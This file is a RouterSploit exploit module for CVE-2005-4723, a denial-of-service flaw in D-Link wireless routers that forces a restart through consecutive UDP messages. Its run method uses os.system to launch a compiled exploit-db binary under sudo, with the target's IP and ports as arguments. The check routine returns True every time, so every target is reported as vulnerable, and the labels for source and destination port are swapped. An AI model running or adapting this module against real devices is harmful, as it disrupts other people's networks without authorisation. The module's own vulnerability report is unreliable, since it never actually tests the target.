
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2005-4723",

        "description": "Multiple wireless access routers of D-Link have a denial of service vulnerability,  "
                       "which may be exploited by remote attackers to cause a denial of service attack on the device. "
                       "If the attacker sends three consecutive pieces of UDP messages, it will cause the device to restart ",

        "authors": (

            "Aaron Portnoy",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/1496",

        ),

        "devices": (

            "Dlink, CVE-2005-4723"
        ),
    }


    target = OptIP("", "destination ip ")
    src_ip = OptIP("","source ip ")
    dst_port = OptPort("","source port ")
    src_port = OptPort("","destination port ")

    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'sudo ./{} -s {} -d {} -a {} -b {}'.format('exploit-db-1496',self.src_ip,self.target,self.src_port,self.dst_port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
